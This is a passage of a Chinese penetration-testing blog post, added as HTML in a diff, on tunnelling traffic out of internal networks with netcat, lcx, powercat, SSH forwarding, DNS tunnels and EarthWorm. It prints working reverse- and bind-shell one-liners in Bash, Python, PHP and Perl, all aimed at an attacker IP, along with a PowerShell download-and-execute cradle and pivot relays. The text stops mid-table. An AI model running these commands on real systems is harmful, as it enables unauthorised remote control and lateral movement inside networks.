@@ -1,0 +1,290 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>内网穿透中流量隧道的选择问题 - Hexo</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Hexo"><meta name="msapplication-TileImage" content="/img/favicon.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Hexo"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="如无特殊说明，笔者规定： 123192.168.1.11-&amp;gt;攻击端192.168.1.12-&amp;gt;目标端192.168.1.13-&amp;gt;中间（跳板）端  判断内网连通性 常用隧道列举：     层级（由低到高） 例子    网络层 IPv6隧道、ICMP隧道、GRE隧道   传输层 SOCKS、TCP隧道、UDP隧道（方式：直接连接、端口转发）   应用层 SSH隧道、HTTP隧道、HT"><meta property="og:type" content="blog"><meta property="og:title" content="内网穿透中流量隧道的选择问题"><meta property="og:url" content="http://example.com/2020/08/28/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B8%AD%E6%B5%81%E9%87%8F%E9%9A%A7%E9%81%93%E7%9A%84%E9%80%89%E6%8B%A9%E9%97%AE%E9%A2%98/"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="如无特殊说明，笔者规定： 123192.168.1.11-&amp;gt;攻击端192.168.1.12-&amp;gt;目标端192.168.1.13-&amp;gt;中间（跳板）端  判断内网连通性 常用隧道列举：     层级（由低到高） 例子    网络层 IPv6隧道、ICMP隧道、GRE隧道   传输层 SOCKS、TCP隧道、UDP隧道（方式：直接连接、端口转发）   应用层 SSH隧道、HTTP隧道、HT"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://example.com/img/%E9%9A%A7%E9%81%93%E9%80%89%E6%8B%A9/%E7%8E%AF%E5%A2%83.jpg"><meta property="og:image" content="http://example.com/img/%E9%9A%A7%E9%81%93%E9%80%89%E6%8B%A9/DNS.jpg"><meta property="og:image" content="http://example.com/img/%E9%9A%A7%E9%81%93%E9%80%89%E6%8B%A9/%E4%BA%8C%E7%BA%A7%E7%BD%91%E7%BB%9Ca.jpg"><meta property="og:image" content="http://example.com/img/%E9%9A%A7%E9%81%93%E9%80%89%E6%8B%A9/%E4%BA%8C%E7%BA%A7%E7%BD%91%E7%BB%9Cb.jpg"><meta property="article:published_time" content="2020-08-28T01:24:42.000Z"><meta property="article:modified_time" content="2021-03-10T02:54:07.103Z"><meta property="article:author" content="John Doe"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/%E9%9A%A7%E9%81%93%E9%80%89%E6%8B%A9/%E7%8E%AF%E5%A2%83.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2020/08/28/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B8%AD%E6%B5%81%E9%87%8F%E9%9A%A7%E9%81%93%E7%9A%84%E9%80%89%E6%8B%A9%E9%97%AE%E9%A2%98/"},"headline":"Hexo","image":["http://example.com/img/%E9%9A%A7%E9%81%93%E9%80%89%E6%8B%A9/%E7%8E%AF%E5%A2%83.jpg","http://example.com/img/%E9%9A%A7%E9%81%93%E9%80%89%E6%8B%A9/DNS.jpg","http://example.com/img/%E9%9A%A7%E9%81%93%E9%80%89%E6%8B%A9/%E4%BA%8C%E7%BA%A7%E7%BD%91%E7%BB%9Ca.jpg","http://example.com/img/%E9%9A%A7%E9%81%93%E9%80%89%E6%8B%A9/%E4%BA%8C%E7%BA%A7%E7%BD%91%E7%BB%9Cb.jpg"],"datePublished":"2020-08-28T01:24:42.000Z","dateModified":"2021-03-10T02:54:07.103Z","author":{"@type":"Person","name":"John Doe"},"description":"如无特殊说明，笔者规定： 123192.168.1.11-&gt;攻击端192.168.1.12-&gt;目标端192.168.1.13-&gt;中间（跳板）端  判断内网连通性 常用隧道列举：     层级（由低到高） 例子    网络层 IPv6隧道、ICMP隧道、GRE隧道   传输层 SOCKS、TCP隧道、UDP隧道（方式：直接连接、端口转发）   应用层 SSH隧道、HTTP隧道、HT"}</script><link rel="canonical" href="http://example.com/2020/08/28/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B8%AD%E6%B5%81%E9%87%8F%E9%9A%A7%E9%81%93%E7%9A%84%E9%80%89%E6%8B%A9%E9%97%AE%E9%A2%98/"><link rel="icon" href="/img/favicon.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Oxanium:wght@300;400;600&amp;family=Roboto+Mono"><link rel="stylesheet" href="/css/cyberpunk.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.4.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.jpg" alt="Hexo" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2020-08-28T01:24:42.000Z" title="2020/8/28上午9:24:42">2020-08-28</time></span><span class="level-item">Updated&nbsp;<time dateTime="2021-03-10T02:54:07.103Z" title="2021/3/10上午10:54:07">2021-03-10</time></span><span class="level-item"><a class="link-muted" href="/categories/Penetration/">Penetration</a></span><span class="level-item">20 minutes read (About 2964 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">内网穿透中流量隧道的选择问题</h1><div class="content"><p>如无特殊说明，笔者规定：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span>-&gt;攻击端</span><br><span class="line"><span class="number">192.168</span><span class="number">.1</span><span class="number">.12</span>-&gt;目标端</span><br><span class="line"><span class="number">192.168</span><span class="number">.1</span><span class="number">.13</span>-&gt;中间（跳板）端</span><br></pre></td></tr></table></figure>
+
+<h1 id="判断内网连通性"><a href="#判断内网连通性" class="headerlink" title="判断内网连通性"></a>判断内网连通性</h1><ul>
+<li>常用隧道列举：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">层级（由低到高）</th>
+<th align="center">例子</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">网络层</td>
+<td align="center">IPv6隧道、ICMP隧道、GRE隧道</td>
+</tr>
+<tr>
+<td align="center">传输层</td>
+<td align="center">SOCKS、TCP隧道、UDP隧道（方式：直接连接、端口转发）</td>
+</tr>
+<tr>
+<td align="center">应用层</td>
+<td align="center">SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道</td>
+</tr>
+</tbody></table>
+<span id="more"></span>
+
+<ul>
+<li>ICMP协议  </li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping baidu.com <span class="comment">//如果收到了传回来的包则说明同时证明了发送和接收</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>TCP协议  </li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -zv <span class="number">192.168</span><span class="number">.1</span><span class="number">.3</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>HTTP协议</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl www.baidu.com:<span class="number">80</span> </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DNS协议  </li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup www.baidu.com </span><br><span class="line">dig www.baidu.com A <span class="comment">//Linux</span></span><br></pre></td></tr></table></figure>
+
+<p><b>还有种情况流量也留不出去，及办公网统一设置代理服务器上网，那么本机直连自然连不到外边</b>——解决方法：<br>1、看一下本机是否与内网其他机器（代理服务器）有端口连接<br>2、看一下内网有没有名为类似proxy的机器<br>3、可以直接看IE等软件的代理设置<br>4、根据pac文件的路径确认<br>5、利用curl进行测试  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl www.baidu.com <span class="comment">//不通</span></span><br><span class="line">curl -x proxy-ip:port www.baidu.com <span class="comment">//通</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="网络隧道的选择"><a href="#网络隧道的选择" class="headerlink" title="网络隧道的选择"></a>网络隧道的选择</h1><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><ul>
+<li>IPv6（待研究）</li>
+</ul>
+<p>IPv6是以IPv4隧道为载体，将自己封装在IPv4的包中发送。当目标机器收到以后，会先解封装众多IPv4包（顺便解了包在IPv6外面的那层IPv4的壳），然后识别IPv6报文</p>
+<ul>
+<li>ICMP</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">工具</th>
+<th align="center">评价</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">icmpsh</td>
+<td align="center">但是他只能通过ICMP协议反弹cmd，功能单一，反弹回来的cmd极不稳定，不推荐使用</td>
+</tr>
+<tr>
+<td align="center">icmptunnel</td>
+<td align="center">它的原理是创建虚拟网卡通过ICMP协议传输网卡流量，基于ICMP隧道的vpn，需要root权限，动静极大，不推荐使用</td>
+</tr>
+<tr>
+<td align="center">pingtunnel</td>
+<td align="center">支持tcp、udp、socks5 over ICMP，速度快，连接稳定，跨平台，client模式不需要管理员权限即可正常使用，推荐使用</td>
+</tr>
+</tbody></table>
+<h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><h3 id="lcx端口转发与映射"><a href="#lcx端口转发与映射" class="headerlink" title="lcx端口转发与映射"></a>lcx端口转发与映射</h3><ul>
+<li>直接进行端口上的转发</li>
+</ul>
+<p>异同：</p>
+<blockquote>
+<p>端口转发是个动作，而端口映射是个规则。转发的一系列动作中有的动作或许会按照映射的规则来进行</p>
+</blockquote>
+<p>lcx端口映射</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//只是建立一个映射规则</span></span><br><span class="line">lcx -tran <span class="number">53</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.12</span>(本机IP) <span class="number">3389</span></span><br></pre></td></tr></table></figure>
+
+<p>lcx端口转发</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//攻击端</span></span><br><span class="line">lcx -listen <span class="number">4444</span> <span class="number">5555</span> <span class="comment">//将4444端口收到的信息转发到5555上（相当于建立了个简易映射）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//目标端</span></span><br><span class="line">lcx -slave <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span>(攻击端IP) <span class="number">4444</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">3389</span> <span class="comment">//将本机的3389转发到攻击端的4444上</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><p>![[nc]]</p>
+<p>端口扫描：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -v <span class="number">192.168</span><span class="number">.1</span><span class="number">.12</span> <span class="number">80</span> <span class="comment">//对80端口进行开放探测</span></span><br><span class="line"></span><br><span class="line">nc -z -v <span class="number">192.168</span><span class="number">.1</span><span class="number">.12</span> <span class="number">233</span><span class="number">-2333</span> <span class="comment">//对一个端口范围进行探测，但是速度有点慢</span></span><br></pre></td></tr></table></figure>
+
+<p>文件传输：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">8888</span> &gt;<span class="number">1.</span>txt <span class="comment">//接收端执行，会先建立一个1.txt的空文档，日后填数据</span></span><br><span class="line"></span><br><span class="line">nc -vn <span class="number">192.168</span><span class="number">.1</span><span class="number">.12</span> <span class="number">8888</span> &lt; <span class="number">1.</span>txt <span class="comment">//发送端执行</span></span><br></pre></td></tr></table></figure>
+
+<p>做跳板：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//攻击端</span></span><br><span class="line">nc -lvp <span class="number">8888</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//目标端</span></span><br><span class="line">nc -lvp <span class="number">8888</span> /bin/sh</span><br><span class="line"></span><br><span class="line"><span class="comment">//跳板端</span></span><br><span class="line">nc -v <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span> <span class="number">8888</span> -c <span class="string">&quot;nc -v 192.168.1.12 8888&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>获取shell：<br>正反向shell与谁设置监听没关系，区别在于shell是接收的还是主动发给别人的</p>
+<ul>
+<li>正向shell</li>
+</ul>
+<p>即接收端设置了自己的shell重定向，攻击端只连接就可以了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//目标端</span></span><br><span class="line">nc -lvp <span class="number">8888</span> -e /bin/sh <span class="comment">//Linux</span></span><br><span class="line">nc -lvp <span class="number">8888</span> -e C:\Windows\system32\cmd.exe <span class="comment">//windows</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//攻击端</span></span><br><span class="line">nc <span class="number">192.168</span><span class="number">.1</span><span class="number">.12</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>反向shell</li>
+</ul>
+<p>即攻击端连接时将自己的shell重定向发送过去，接收端只监听就可以了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//目标端</span></span><br><span class="line">nc -lvp <span class="number">8888</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//攻击端</span></span><br><span class="line">nc <span class="number">192.168</span><span class="number">.1</span><span class="number">.12</span> <span class="number">8888</span> -e /bin/sh</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="其他shell获取途径"><a href="#其他shell获取途径" class="headerlink" title="其他shell获取途径"></a>其他shell获取途径</h3><p>往往目标机是没有nc的，所以有其他几种不用nc来反向shell途径</p>
+<ul>
+<li>python</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//攻击端开启nc监听</span></span><br><span class="line">nc -lvp <span class="number">8888</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//目标机执行</span></span><br><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.11&quot;,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Bash</li>
+</ul>
+<p>根据Bash的[[Linux知识#0x0B 重定向符]]重定向shell至攻击端</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//攻击端开启nc监听</span></span><br><span class="line">nc -lvp <span class="number">8888</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//目标机执行</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span>/<span class="number">8888</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> <span class="comment">//-i代表打开一个交互式bash shell</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>PHP反向shell</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//攻击端开启nc监听</span></span><br><span class="line">nc -lvp <span class="number">8888</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//目标机执行</span></span><br><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.1.11&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Perl</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//攻击端开启nc监听</span></span><br><span class="line">nc -lvp <span class="number">8888</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//目标机执行</span></span><br><span class="line">perl -e &#x27;use Socket;$i=&quot;192.168.1.11&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open (STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h3><ul>
+<li>powercat相当于powershell的版的nc，有自己的优点</li>
+</ul>
+<p>弹回powershell</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在目标机上下载powercat</span></span><br><span class="line">IEX (New-Object Net.WebClient).Downloading(&#x27;http://192.168.1.11/powercat.ps1&#x27;)</span><br><span class="line"></span><br><span class="line">然后执行</span><br><span class="line">powercat -l -p <span class="number">8888</span> -v</span><br><span class="line"></span><br><span class="line"><span class="comment">//攻击端</span></span><br><span class="line">powercat -c <span class="number">192.168</span><span class="number">.1</span><span class="number">.12</span> -p <span class="number">8888</span> -v -ep</span><br></pre></td></tr></table></figure>
+
+<p>传文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//接收端</span></span><br><span class="line">powercat -l -p <span class="number">8888</span> -of <span class="number">1.</span>txt -v</span><br><span class="line"></span><br><span class="line"><span class="comment">//发送端</span></span><br><span class="line">powercat -c <span class="number">192.168</span><span class="number">.1</span><span class="number">.12</span> -p <span class="number">8888</span> -i C:\<span class="number">1.</span>txt -v <span class="comment">//-i的这个输入可以写字符串，也可以写文件名</span></span><br></pre></td></tr></table></figure>
+
+<p>做跳板</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//攻击端</span></span><br><span class="line">nc <span class="number">192.168</span><span class="number">.1</span><span class="number">.13</span> <span class="number">8888</span> -vv <span class="comment">//这里写跳板ip</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//目标端</span></span><br><span class="line">powercat -l -v -p <span class="number">8888</span> -e cmd.exe</span><br><span class="line"></span><br><span class="line"><span class="comment">//跳板端</span></span><br><span class="line">powercat -l -v -p <span class="number">8888</span> -r tcp:<span class="number">192.168</span><span class="number">.1</span><span class="number">.12</span>:<span class="number">8888</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><h3 id="ssh协议"><a href="#ssh协议" class="headerlink" title="ssh协议"></a>ssh协议</h3><p>参见<a target="_blank" rel="noopener" href="https://jeremyxu2010.github.io/2018/12/ssh%E7%9A%84%E4%B8%89%E7%A7%8D%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">SSH的三种端口转发</a><br>![[SSH协议]]</p>
+<p>假设有以下环境,攻击端为VPS，目标端为数据库服务器，跳板为Web服务器<br><img src="/img/%E9%9A%A7%E9%81%93%E9%80%89%E6%8B%A9/%E7%8E%AF%E5%A2%83.jpg"></p>
+<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><ul>
+<li>本地端口转发</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//攻击端（下面这个是一行命令）执行这个就直接完事了（执行完会让你输一下跳板机密码）</span></span><br><span class="line">ssh -CfNg -L <span class="number">8888</span>:<span class="number">1.1</span><span class="number">.1</span><span class="number">.10</span>:<span class="number">3389</span>（VPS端口:目标主机:目标端口） root@<span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span> </span><br><span class="line"><span class="comment">//相当于是通过最后的这个跳板ip，将前面的目标 ip:端口 转发到本地的8888上</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//可以用下面这个确定连接</span></span><br><span class="line">netstat -tulnp | grep <span class="string">&quot;8888&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//攻击端，因为连接的是3389的远程桌面服务，所以我们可以用rdesktop来启动</span></span><br><span class="line">rdesktop <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br></pre></td></tr></table></figure>
+
+<p>本地转发是直接将目标机的端口数据转发到攻击端端口</p>
+<ul>
+<li>远程转发</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//跳板上，和本地不同的是，参数与转发对象</span></span><br><span class="line">ssh -CfNg -R <span class="number">8888</span>:<span class="number">1.1</span><span class="number">.1</span><span class="number">.10</span>:<span class="number">3389</span>（VPS端口:目标主机:目标端口） root@<span class="number">192.168</span><span class="number">.1</span><span class="number">.4</span></span><br><span class="line"><span class="comment">//相当于是将后面攻击端ip的8888端口流量转发到目标端的 ip:端口 ，然后访问本地的8888，相当于访问对面的3389</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//攻击端，同样因为连接的是3389的远程桌面服务，所以我们可以用rdesktop来启动</span></span><br><span class="line">rdesktop <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br></pre></td></tr></table></figure>
+
+<p>远程转发是在跳板端建立一个监听端口（此端口未知），之后所有访问目标端特定端口（3389）的数据都会通过跳板机的那个监听端口返回给攻击端的特定端口（8888）</p>
+<h4 id="与SOCKS结合的动态转发"><a href="#与SOCKS结合的动态转发" class="headerlink" title="与SOCKS结合的动态转发"></a>与SOCKS结合的动态转发</h4><blockquote>
+<p>相对于本地转发和远程转发的单一端口转发模式而言，动态转发有点更加强劲的端口转发功能，即是无需固定指定被访问目标主机的端口号。这个端口号需要在本地通过协议指定，该协议就是简单、安全、实用的 SOCKS 协议。<br>动态转发通过参数 -D 指定，格式：-D [本地主机:]本地主机端口。相对于前两个来说，动态转发无需再指定远程主机及其端口。它们由通过 SOCKS协议 连接到本地主机端口的那个主机。<br>举例：ssh -D 50000 user@host1。这条命令创建了一个SOCKS代理，所以通过该SOCKS代理发出的数据包将经过host1转发出去。</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//攻击端</span></span><br><span class="line">ssh -CfNg -D <span class="number">8888</span> root@<span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span></span><br></pre></td></tr></table></figure>
+<p>然后再在浏览器端设置SOCKS5代理：127.0.0.1:8888</p>
+<p>这个时候就可以在浏览器上访问内网的所有IP了</p>
+<h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><ul>
+<li>reGeorg</li>
+</ul>
+<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>![[DNS]]<br>DNS隧道木马的通信框架如下：<br><img src="/img/%E9%9A%A7%E9%81%93%E9%80%89%E6%8B%A9/DNS.jpg"></p>
+<ul>
+<li>一般隧道通信就是直接通过被控机来进行，但是DNS隧道是通过内网内的DNS服务器来作为中转来进行的，其他协议都封装在了DNS协议中去传输</li>
+</ul>
+<h4 id="查看DNS得连通性"><a href="#查看DNS得连通性" class="headerlink" title="查看DNS得连通性"></a>查看DNS得连通性</h4><ul>
+<li>要做的是确保目标端是否与内部DNS服务器连通，且内部域名与外部域名都能解析</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/resolv.conf | grep -v <span class="string">&#x27;#&#x27;</span> <span class="comment">//resolv.conf是Linux里本机的DNS配置，可以看到本机当前网络环境的域名及IP</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//检测内部域名是否可以解析，假设上一步得到网络环境的域名为subdomain.domain</span></span><br><span class="line">nslookup subdomain.domain <span class="comment">//正常返回解析结果说明连通</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//检测外部域名是否可以解析</span></span><br><span class="line">nslookup baidu.com <span class="comment">//正常返回解析结果说明连通</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h4><ul>
+<li>因为都要购买域名，待补充，参见:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2214">Powershell+Dnscat2实现DNS隐蔽隧道反弹Shell</a></li>
+</ul>
+<h4 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h4><ul>
+<li>待补充</li>
+</ul>
+<h3 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h3><p>![[SOCKS]]</p>
+<h4 id="ew"><a href="#ew" class="headerlink" title="ew"></a>ew</h4><p>全名EarthWorm，项目地址：<a target="_blank" rel="noopener" href="https://github.com/rootkiter/EarthWorm">https://github.com/rootkiter/EarthWorm</a><br>新版本叫Termite，项目地址：<a target="_blank" rel="noopener" href="https://github.com/rootkiter/Termite">https://github.com/rootkiter/Termite</a></p>
+<ul>
+<li>要想使用这个工具所建立SOCKS隧道，必须在那个机器上上传ew</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">情况</th>
+<th align="center">需要的功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">正向（一般）连接</td>
+<td align="center">攻击端直接访问；目标端：ssocksd</td>
+</tr>
+<tr>
+<td align="center">反向连接</td>
+<td align="center">攻击端：rcsocks；目标端：rssocks</td>
